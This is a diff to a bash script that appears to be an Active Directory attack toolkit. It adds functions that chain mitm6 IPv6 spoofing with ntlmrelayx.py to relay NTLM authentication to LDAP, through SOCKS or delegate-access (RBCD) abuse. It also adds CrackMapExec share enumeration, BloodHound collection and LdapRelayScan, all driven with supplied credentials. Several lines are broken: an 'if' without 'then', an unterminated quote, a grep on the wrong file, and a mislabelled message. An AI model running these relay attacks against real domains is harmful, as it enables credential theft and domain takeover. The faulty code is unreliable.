@@ -352,7 +352,7 @@ function ntlmrelay_ldap_rbcd() {
                         tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
                         tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/ldap_targets.txt -smb2support --delegate-access -wh fake-wpad' C-m
                 else
-                        echo -ne $red'[-] ERROR: ldap_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
+                        echo -ne $red'[-] ERROR: ldap_targets.txt does not exist.\nTry running the Enum -> LDAP enumeration module\n'$clear
                 fi
         }
         ColorCyan '\nRelay to an individual host or a list of targets?\n'
@@ -378,11 +378,77 @@ function ntlmrelay_multi() {
 }
 
 function mitm6_ldap_socks() {
-        echo "temp"
+	mitm6_socks_solo() {
+                ColorCyan 'Enter target host: '
+                read solo_target
+                export solo_target=$solo_target
+                echo -e '[*] Setting up mitm6 + Ntlmrelayx.py to one LDAP target (socks)...\n'
+                tmux new-window -e "solo_target=${solo_target}" -n "relay"
+                tmux send-keys -t 5head:relay 'mitm6 -d ${domain} -i ${interface} --ignore-nofqdn' C-m
+                tmux split-window -e "solo_target=${solo_target}" -h -l 50%
+                tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support -socks -wh fake-wpad' C-m
+	}
+	mitm6_socks_multi() {
+                if test -f "loot/ldap_targets.txt"; then
+                        echo -e '[*] Setting up mitm6 + Ntlmrelayx.py to LDAP targets file (socks)...\n'
+                        tmux new-window -n "relay"
+                        tmux send-keys -t 5head:relay 'mitm6 -d ${domain} -i ${interface} --ignore-nofqdn' C-m
+                        tmux split-window -h -l 50%
+                        tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                        tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/ldap_targets.txt -smb2support -socks -wh fake-wpad' C-m
+                else
+                        echo -ne $red'[-] ERROR: ldap_targets.txt does not exist.\nTry running the Enum -> LDAP enumeration module\n'$clear
+                fi
+
+	}
+        ColorCyan '\nRelay to an individual host or a list of targets?\n'
+        ColorGreen '1)' && echo -e " Specific host"
+        ColorGreen '2)' && echo -e " Targets file"
+        ColorCyan 'Choose an option: '
+                read a
+                case $a in
+                        1) mitm6_socks_solo ;;
+                        2) mitm6_socks_multi ;;
+                        *) echo -e "Invalid command entered... exiting\n\n";
+                esac
 }
 
 function mitm6_ldap_rbcd() {
-        echo "temp"
+        mitm6_rbcd_solo() {
+                ColorCyan 'Enter target host: '
+                read solo_target
+                export solo_target=$solo_target
+                echo -e '[*] Setting up mitm6 + Ntlmrelayx.py to one LDAP target (rbcd)...\n'
+                tmux new-window -e "solo_target=${solo_target}" -n "relay"
+                tmux send-keys -t 5head:relay 'mitm6 -d ${domain} -i ${interface} --ignore-nofqdn' C-m
+                tmux split-window -e "solo_target=${solo_target}" -h -l 50%
+                tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support --delegate-access -wh fake-wpad' C-m
+        }
+        mitm6_rbcd_multi() {
+                if test -f "loot/ldap_targets.txt"; then
+                        echo -e '[*] Setting up mitm6 + Ntlmrelayx.py to LDAP targets file (socks)...\n'
+                        tmux new-window -n "relay"
+                        tmux send-keys -t 5head:relay 'mitm6 -d ${domain} -i ${interface} --ignore-nofqdn' C-m
+                        tmux split-window -h -l 50%
+                        tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                        tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/ldap_targets.txt -smb2support --delegate-access -wh fake-wpad' C-m
+                else
+                        echo -ne $red'[-] ERROR: ldap_targets.txt does not exist.\nTry running the Enum -> LDAP enumeration module\n'$clear
+                fi
+
+        }
+        ColorCyan '\nRelay to an individual host or a list of targets?\n'
+        ColorGreen '1)' && echo -e " Specific host"
+        ColorGreen '2)' && echo -e " Targets file"
+        ColorCyan 'Choose an option: '
+                read a
+                case $a in
+                        1) mitm6_rbcd_solo ;;
+                        2) mitm6_rbcd_multi ;;
+                        *) echo -e "Invalid command entered... exiting\n\n";
+                esac
 }
 
 
@@ -432,7 +498,17 @@ function kerberoast() {
 }
 
 function share_enum() {
-        echo "temp"
+	domain_var
+	if ! test -f "loot/domain_targets.txt" && ! test -f "loot/cme_enum_smb.txt"
+		echo -ne $red'[-] ERROR: could not create domain_targets.txt.\nTry running the Enum -> SMB enumeration module\n'$clear
+		return
+	elif ! test -f "loot/domain_targets.txt" && test -f "loot/cme_enum_smb.txt"; then
+		grep -F -- "$domain" loot/cme_enum_smb.txt >> loot/domain_targets.txt
+	fi
+        tmux new-window -n "share_enum"
+	tmux send-keys -t 5head:share_enum 'bash -c "stty -echo;clear;echo -e \"[*] Using CME to look for non-default SMB file shares...\n[*] Output will be saved to loot/share_enum.txt\";stty echo"' C-m
+        tmux send-keys -t 5head:share_enum 'deps/cme smb loot/domain_targets.txt -u ${username} -p ${password} -d ${domain} >> loot/share_enum.txt' C-m
+	tmux send-keys -t 5head:share_enum 'egrep -a -i -e \'READ|WRITE\' loot/domain_targets.txt | egrep -a -v -i -e \'IPC\$|print\$|NETLOGON|SYSVOL|CertEnroll\''
 }
 
 function adcs_enum() {
@@ -456,15 +532,50 @@ function adcs_enum() {
 }
 
 function bloodhound_py() {
-        echo "temp"
+        domain_var
+        if [[ -z ${dc} ]]; then
+                ColorRed '[-] ERROR: domain controller not specified.\nWould you like to specify one?\n'
+                ColorGreen '1)' && echo -e " Yes"
+                ColorGreen '2)' && echo -e " Exit"
+                ColorCyan 'Choose an option: '
+                        read a
+                        case $a in
+                                1) var_setter 'dc' ;;
+                                2) return ;;
+                                *) echo -e "Invalid command entered... exiting\n\n";
+                        esac
+                return
+        fi
+        tmux new-window -e "dc=${dc}" -e "domain=${domain}" -e "username=${username}" -e "password=${password}" -n "bloodhound"
+        tmux send-keys -t 5head:bloodhound 'bash -c "stty -echo;clear;echo -e \"[*] Gathering BloodHound data with bloodhound-python...\n\";stty echo"' C-m
+	tmux send-keys -t 5head:bloodhound 'bloodhound-python -c all -u ${username} -p ${password} -ns ${dc}
 }
+
 
 function coerce_check() {
         echo "temp"
 }
 
+
 function ldap_sign_scan() {
-        echo "temp"
+        domain_var
+        if [[ -z ${dc} ]]; then
+                ColorRed '[-] ERROR: domain controller not specified.\nWould you like to specify one?\n'
+                ColorGreen '1)' && echo -e " Yes"
+                ColorGreen '2)' && echo -e " Exit"
+                ColorCyan 'Choose an option: '
+                        read a
+                        case $a in
+                                1) var_setter 'dc' ;;
+                                2) return ;;
+                                *) echo -e "Invalid command entered... exiting\n\n";
+                        esac
+                return
+        fi
+        tmux new-window -e "dc=${dc}" -e "domain=${domain}" -e "username=${username}" -e "password=${password}" -n "LdapRelayScan"
+        tmux send-keys -t 5head:LdapRelayScan 'bash -c "stty -echo;clear;echo -e \"[*] Enumerating LDAP channel binding and signing with LdapRelayScan...\n\";stty echo"' C-m
+        tmux send-keys -t 5head:LdapRelayScan 'source deps/LdapRelayScan/bin/activate' C-m
+	tmux send-keys -t 5head:LdapRelayScan 'python3 deps/LdapRelayScan/LdapRelayScan.py -method BOTH -dc-ip ${dc} -u ${username} -p ${password}' C-m
 }
 
 function maq() {
